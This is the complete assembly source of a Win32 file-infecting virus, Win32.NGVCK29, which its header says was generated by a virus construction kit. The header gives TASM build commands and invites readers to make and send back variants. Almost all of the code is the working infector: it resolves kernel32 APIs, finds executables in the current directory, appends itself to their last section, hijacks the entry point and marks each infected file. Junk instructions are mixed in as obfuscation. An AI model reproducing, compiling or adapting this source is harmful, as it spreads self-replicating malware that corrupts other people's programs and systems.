              
;
;
; Win32.NGVCK29 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK29
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 29
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 sub dword ptr [esp], offset Delta
                                        ; add esp, 4
 dec esp
 add esp, 5d
 mov edx, dword ptr [esp-4]
                                        ; mov ebp, edx
 push edx
 pop ebp
 jmp KernelSearchStart


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 push dword ptr [ebp+MapAddress]
 pop esi
                                        ; retrieve PE - Header
 mov edi, esi
 add edi, [esi+3Ch]
                                        ; get File Alignment
                                        ; add edi, 60
 add edi, 60d
 mov edx, [edi]
 sub edi, 60d
                                        ; mov eax, -1
 mov eax, ( -1d - 31d )
 add eax, 31d
 and eax, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 mov dword ptr [ebp+AlignReg2], 0
 xor dword ptr [ebp+AlignReg2], edx
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], eax
 neg ebx                                ; Trash
 call Align
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 push eax
 pop dword ptr [ebp+NewSize]
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], -1
 and dword ptr [ebp+WFD_nFileSizeLow], eax
 sub ecx, 18810429d                     ; Trash
 call CreateMap
 jc NoEXE
                                        ; mov esi, -1
 mov esi, ( -1d - 6d )
 add esi, 6d
 and esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov eax, esi
 add eax, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
 push eax
 pop esi
                                        ; get last section
                                        ; clear ebx
 sub ebx, ebx
 mov bx, word ptr [esi+06h]
 dec ebx
 imul ebx, ebx, 28h
                                        ; add eax, 120
 inc eax
 add eax, 119d
 add eax, ebx
 shl edx, 23d                           ; Trash
                                        ; clear ebx
 sub ebx, ebx
 add ebx, dword ptr [esi+74h]
 shl ebx, 3
 add eax, ebx
                                        ; get old Entrypoint
 mov ebx, dword ptr [esi+28h]
 push ebx
 pop dword ptr [ebp+OldEIP]
 sbb edx, 28d                           ; Trash
 mov edx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], edx
 mov edx, [eax+10h]
                                        ; mov ecx, edx
                                        ; clear ecx
 mov ecx, -4714d
 add ecx, 4714d
 add ecx, edx
 add eax, 14h
 add edx, [eax]
 sub eax, 14h
 push edx
 push ecx
 pop ebx
 add ebx, [eax+0Ch]
 push ebx
 pop dword ptr [ebp+NewEIP]
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], ebx
                                        ; clear ebx
 mov ebx, 23840d
 sub ebx, 23840d

 add ebx, [eax+10h]
 sub dword ptr [ebp+Trash1], 597357     ; Trash
 push ebx
                                        ; calculate new section size
 push dword ptr  [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 add ebx, VirusSize
 push ebx
 pop dword ptr [ebp+AlignReg1]
 call Align
 mov ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [eax+10h], 0h
 add dword ptr [eax+10h], ebx
 pop ebx
 add ebx, VirusSize
 mov dword ptr [eax+08h], 0
 add dword ptr [eax+08h], ebx
 mov ebx, dword ptr [eax+10h]
 add ebx, dword ptr [eax+0Ch]
 mov dword ptr [esi+50h], ebx
                                        ; set write, read and code flag
 or dword ptr [eax+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 lea esi, [ebp+Virus]

 mov ebx, VirusSize
 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec ebx
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; mov edx, -1
 push -1d
 pop edx
 and edx, dword ptr [ebp+InfCounter]
 add edx, -1
 push edx
 pop dword ptr [ebp+InfCounter]
 clc
ret

NoEXE:
 stc
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for maximum filesize
                                        ; clear edx
 mov edx, 0
 xor edx, dword ptr [ebp+WFD_nFileSizeHigh]
 cmp edx, 0
 jne NoInfection
                                        ; check for minimum filesize
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop ebx
 cmp ebx, 20000d
 jbe NoInfection
                                        ; get and remove file attributes
 lea edx, [ebp+WFD_szFileName]

 push edx
 xor eax, eax                           ; Trash
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov ebx, 128
 mov ebx, ( 128d xor 37d )
 xor ebx, 37d
 push ebx
 mov ebx, ebp
 add ebx, offset WFD_szFileName


 push ebx
 call dword ptr [ebp+XSetFileAttributesA]
 or eax, eax
 jz NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 push dword ptr [ebp+MapAddress]
 pop ecx
                                        ; check for ZM
 cmp word ptr [ecx], 'ZM'
 je Goodfile
                                        ; mov ebx, 12392
 mov ebx, ( 12392d + 13d )
 sub ebx, 13d
 test ebx, ebx
 jnz Notagoodfile
Goodfile:
                                        ; clear eax
 mov eax, -19797d
 add eax, 19797d
 mov ax, word ptr [ecx+3Ch]
 sub eax, 1
 inc eax
 jz Notagoodfile
                                        ; clear edx
 sub edx, edx
 add edx, dword ptr [ecx+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],edx
 jb Notagoodfile
 add edx, ecx
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [edx], 'EP'
 je Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edx+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
 inc ebx                                ; Trash
                                        ; check for DLL
 mov ax, word ptr [edx+16h]
 and ax, 0F000h
 cmp ax, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection2

Notagoodfile:
 call UnMapFile

NoInfection2:

                                        ; restore the file attributes
                                        ; clear eax
 mov eax, 0
 add eax, dword ptr [ebp+Attributes]
 push eax
 mov eax, offset WFD_szFileName
 add eax, ebp

 push eax
 call dword ptr [ebp+XSetFileAttributesA]

NoInfection:
ret




;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ebx Lenght of API-Name
                                        ; edi Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad


                                        ; clear the counter
 mov word ptr [ebp+counter], 0h


                                        ; clear ecx
 mov ecx, 0
 xor ecx, dword ptr [ebp+NTableVA]
 sub dword ptr [ebp+Trash1], ebx        ; Trash


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], 0
 xor dword ptr [ebp+NTableTemp], ecx
                                        ; clear edx
 mov edx, 0
 add edx, dword ptr [ebp+KernelMZ]
 add edx, dword ptr [ecx]
                                        ; mov ecx, edx
 push edx
 pop ecx
                                        ; mov esi, edx
 mov esi, edx
 mov dword ptr [ebp+TempApisearch1], ebx
 mov dword ptr [ebp+TempApisearch2], 0
 add dword ptr [ebp+TempApisearch2], esi
 push edi
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; edi Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov dl, byte ptr [esi]
 cmp dl, byte ptr [edi]
 jne ApiNotFound
 add ebx, -1
                                        ; add ebx, 1
 inc ebx
 dec ebx
 jz FoundApi1
                                        ; add esi, 1
 add esi, 1d
                                        ; add edi, 1
 sub edi, -1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop edi
 push dword ptr [ebp+NTableTemp]
 pop ecx
 push dword ptr [ebp+TempApisearch1]
 add eax, edx                           ; Trash
 pop ebx
 push dword ptr [ebp+TempApisearch2]
 pop esi
                                        ; add ecx, 4
 add ecx, 4d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2000h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4h
                                        ; retrieve the offset
 movzx ecx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl ecx, 1                             ; multiply with 2
 add ecx, dword ptr [ebp+OTableVA]
 xchg ecx, esi
                                        ; clear ecx
 mov ecx, -390d
 add ecx, 390d
 mov cx, word ptr [esi]
 sal ecx, 2h
 add ecx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 push dword ptr [ebp+KernelMZ]
 pop edx
 add edx, dword ptr [ecx]
 mov dword ptr [ebp+TempAPI], 0
 add dword ptr [ebp+TempAPI], edx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop eax
 popad
 jmp ExecuteHost



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ecx
 mov ecx, 0

 push ecx
 push ecx
 push 3h
 push ecx
                                        ; add ecx, 1
 add ecx, 1d
 push ecx
 push 80000000h or 40000000h
 lea edi, [ebp+WFD_szFileName]
 xchg edx, edi

 push edx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], -1
 and dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
                                        ; clear ebx
 push 0
 pop ebx
 add ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx

                                        ; clear ecx
 xor ecx, ecx
 push ecx
 push ebx
 push ecx
 push 00000004h
 push ecx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 push eax
 pop dword ptr [ebp+MapHandle]
 pop ebx
 cmp eax, 0
 je CloseFile
 push ebx
 push 0
 push 0
                                        ; mov eax, 2
 mov eax, ( 2d + 18d )
 sub eax, 18d
 push eax
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
                                        ; add eax, 1
 inc eax
 dec eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], -1
 and dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+Trash1]
 pop ebx

 mov dword ptr [ebp+Trash2], 0
 xor dword ptr [ebp+Trash2], ebx

                                        ; clear edx
 sub edx, edx
 xor edx, dword ptr [ebp+OldBase]

 push edx
 pop dword ptr [ebp+retBase]

 mov ecx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], -1
 and dword ptr [ebp+retEIP], ecx




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea edx, [ebp+filemask]
 xchg eax, edx

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 add eax, 1d
 add eax, -1
 add eax, 1
 jz EndInfectCurDir
                                        ; Set Infection Counter
 push 20d
 pop dword ptr [ebp+InfCounter]

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile
 sar ebx, 7d                            ; Trash

EndInfectCurDir:
                                        ; Close the Handle
 mov esi, dword ptr [ebp+FindHandle]
 push esi
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
                                        ; clear edx
 sub edx, edx
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
 div ebx
                                        ; add eax, 1
 sub eax, -1d
 mul ebx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 OldEIP      dd 0h

 APIOffsets:
 XFindFirstFileA        dd 0h
 XFindClose             dd 0h
 XSetFileAttributesA    dd 0h
 XGetFileAttributesA    dd 0h
 XCreateFileA           dd 0h
 XCreateFileMappingA    dd 0h
 XFindNextFileA         dd 0h
 XMapViewOfFile         dd 0h
 XUnmapViewOfFile       dd 0h
 XCloseHandle           dd 0h

 K32Trys     dd 0h
 FindHandle  dd 0h
 FileHandle  dd 0h
 NewEIP      dd 0h
 AlignReg1   dd 0h

 APINames:
 db 'FindFirstFileA', 0
 db 'FindClose', 0
 db 'SetFileAttributesA', 0
 db 'GetFileAttributesA', 0
 db 'CreateFileA', 0
 db 'CreateFileMappingA', 0
 db 'FindNextFileA', 0
 db 'MapViewOfFile', 0
 db 'UnmapViewOfFile', 0
 db 'CloseHandle', 0

 AlignReg2   dd 0h
 NTableVA    dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 ATableVA    dd 0h
 NTableTemp  dd 0h
 Attributes  dd 0h
 NewSize     dd 0h
 InfCounter  dd 0h
 TempAPI     dd 0h
 counter     dw 0h
 TempApisearch2 dd 0h
 KernelMZ    dd 0h
 MapHandle   dd 0h
 KernelPE    dd 0h
 MapAddress  dd 0h
 TempApisearch1 dd 0h
 Trash2      dd 0h
 filemask    db '*.eXE',0
 Trash1      dd 0h
 OTableVA    dd 0h
 OldBase     dd 400000h
 db 'Win32.NGVCK29 - SnakeByte',0




;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 push NumberOfApis
 pop edx

                                        ; load API Names and Offsets
 mov eax, offset APIOffsets
 add eax, ebp

 lea ebx, [ebp+APINames]
 xchg edi, ebx


GetApisLoop: 

 mov ebx, edi
APINameDetect:                          ; calculate the lenght of the names
 inc ebx
 cmp byte ptr [ebx], 0
 jne APINameDetect

 sub ebx, edi
                                        ; search 'em
                                        ; ebx contains Name-Lenght
                                        ; edi points to the Name
                                        ; eax points to the offset

 call SearchAPI1
 add edi, ebx
                                        ; add edi, 1
 sub edi, -1d
 push dword ptr [ebp+TempAPI]
 pop ecx
 mov dword ptr [eax], 0
 add dword ptr [eax], ecx
                                        ; add eax, 4
 dec eax
 add eax, 5d
 sub edx, 1
 jnz GetApisLoop
 mov ebx, offset Outbreak
 add ebx, ebp

 push ebx
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; mov eax, -1
 mov eax, ( -1d + 21d )
 sub eax, 21d
 and eax, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 xor dword ptr [ebp+retBase], eax

                                        ; mov eax, -1
 push -1d
 pop eax
 and eax, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], eax



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 or ebp, ebp
 jz FirstGenHost
 mov ebx,12345678h
 org $-4
 retBase dd 0h
 add ebx,12345678h
 org $-4
 retEIP dd 0h
 push ebx
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea eax, [ebp+WFD_szFileName]
 xchg eax, esi

                                        ; mov ebx, 276
 mov ebx, ( 276d - 1d )
 add ebx, 1d

ClearOldData2:
 mov byte ptr [esi], 0h
                                        ; add esi, 1
 sub esi, -1d
 dec ebx
 jnz ClearOldData2
 and ecx, edx                           ; Trash
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea edi, [ebp+WIN32_FIND_DATA]

 push edi
 push eax
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
 sal ecx, 2d                            ; Trash
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]

 push edx
                                        ; clear eax
 mov eax, 0
 xor eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret





;        [ ///// * Search Kernel Procedure * \\\\\ ]

 sar ecx, 7d                            ; Trash
KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov eax, dword ptr [esp]
                                        ; round to pages
 mov ax, 0h
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 5h

GK1:                                    ; check for DOS-EXE Stub
 push dword ptr [ebp+K32Trys]
 pop ecx
 cmp ecx, 0h
 jnz GotKernelXX
 jmp NoKernel
GotKernelXX:
                                        ; check for ZM
 cmp word ptr [eax], 'ZM'
 je CheckPE

GK2:
 dec eax
 sub eax, 65535d
 inc dword ptr [ebp+K32Trys]
 sub dword ptr [ebp+K32Trys], 2
 mov dword ptr [ebp+Trash1], eax        ; Trash
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
                                        ; add eax, 60
 dec eax
 add eax, 61d
 mov esi, [eax]
                                        ; mov edx, 60
 mov edx, ( 60d xor 25d )
 xor edx, 25d
 sub eax, edx
 add esi, eax
                                        ; check for EP
 cmp word ptr [esi], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add esi, 22
 dec esi
 add esi, 23d
                                        ; clear ecx
 mov ecx, 46707d
 sub ecx, 46707d
 mov cx, word ptr [esi]
 and cx, 0F000h
 cmp cx, 02000h
 je GotDLL
 jmp GK2
GotDLL:                                 ; we found a DLL file
 inc esi
 sub esi, 23d


KernelFound:
 mov dword ptr [ebp+KernelMZ], 0
 xor dword ptr [ebp+KernelMZ], eax
 mov dword ptr [ebp+KernelPE], 0
 xor dword ptr [ebp+KernelPE], esi

 lea eax, GetApis
 add eax, ebp
                                        ; clear edx
 push 0
 pop edx
 add edx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ebx
 and ebx, 0
 add ebx, [edx+78h]
 add ebx, [ebp+KernelMZ]
                                        ; add ebx, 28
 add ebx, 28d
                                        ; get ATableVA
 mov edx, dword ptr [ebx]
                                        ; add ebx, 4
 add ebx, 4d
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], edx
                                        ; get NTableVA
 mov edx, dword ptr [ebx]
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], edx
 inc ecx                                ; Trash
                                        ; get OTableVA
 mov edx, dword ptr [ebx]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edx
 push eax
ret


CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

